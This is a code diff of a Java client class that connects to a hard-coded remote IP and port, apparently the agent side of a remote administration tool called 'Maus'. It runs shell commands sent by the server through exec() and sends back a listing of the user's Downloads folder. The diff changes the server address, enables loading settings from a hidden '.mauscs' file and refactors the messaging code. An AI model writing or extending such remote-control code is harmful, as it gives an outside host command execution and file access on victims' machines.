@@ -4,7 +4,7 @@ import java.io.*;
 import java.net.Socket;
 
 public class Client {
-    private static String HOST = "141.219.244.29";
+    private static String HOST = "141.219.247.21";
     private static int PORT = 22122;
     private BufferedOutputStream out;
     private Socket socket;
@@ -29,7 +29,7 @@ public class Client {
     public static void main(String[] args) throws InterruptedException {
         /* Load server settings and then attempt to connect to Maus. */
         Client client = new Client();
-//        client.loadServerSettings();
+        client.loadServerSettings();
         client.connect();
     }
 
@@ -47,11 +47,11 @@ public class Client {
                     exec(comm.replace("CMD ", ""));
                 }
                 if (comm.contains("FILELIST")){
+                    communicate("FILELIST");
                     sendFileList();
                 }
                 if (comm.equals("forciblyclose")) {
-                    Writer writer = new OutputStreamWriter(out);
-                    writer.write("forciblyclose");
+                    communicate("forciblyclose");
                     System.exit(0);
                 }
             }
@@ -66,13 +66,7 @@ public class Client {
 
     /* Sends a message to the Server. */
     private void communicate(String msg) throws IOException {
-        PrintWriter writer = new PrintWriter(out);
-        writer.write(msg);
-        writer.flush();
-    }
-
-    private void communicate(int msg) throws IOException {
-        PrintWriter writer = new PrintWriter(out);
+        Writer writer = new OutputStreamWriter(out);
         writer.write(msg);
         writer.flush();
     }
@@ -92,6 +86,7 @@ public class Client {
                 }
                 communicate("end");
             } catch (IOException e) {
+                e.printStackTrace();
                 exec("");
             }
 
@@ -99,9 +94,9 @@ public class Client {
     }
 
     private void loadServerSettings() {
-        try (BufferedReader reader = new BufferedReader(new FileReader(new File(Client.class.getProtectionDomain().getCodeSource().getLocation() + "Client/.mauscs")))
+        String path = Client.class.getProtectionDomain().getCodeSource().getLocation().getPath();
+        try (BufferedReader reader = new BufferedReader(new FileReader(new File( path + "Client/.mauscs")))
         ) {
-            System.out.println("Run");
             String line;
             StringBuilder stringBuilder = new StringBuilder();
             while ((line = reader.readLine()) != null) {
@@ -118,18 +113,21 @@ public class Client {
         }
     }
 
-    private void sendFileList() throws IOException {
-        String directory = System.getProperty("user.home") + "/Downloads/";
-        File[] files = new File(directory).listFiles();
-        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-        DataOutputStream dos = new DataOutputStream(bos);
-        communicate("FILELIST");
-        dos.writeInt(files.length);
-        for (File file : files) {
-            String name = file.getName();
-            dos.writeUTF(name);
+    private void sendFileList() {
+        try(       BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
+                   DataOutputStream dos = new DataOutputStream(bos)){
+            String directory = System.getProperty("user.home") + "/Downloads/";
+            File[] files = new File(directory).listFiles();
+
+            dos.writeInt(files.length);
+            for (File file : files) {
+                String name = file.getName();
+                dos.writeUTF(name);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
         }
-        dos.close();
+
 //        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
 //        DataOutputStream dos = new DataOutputStream(bos);
 //
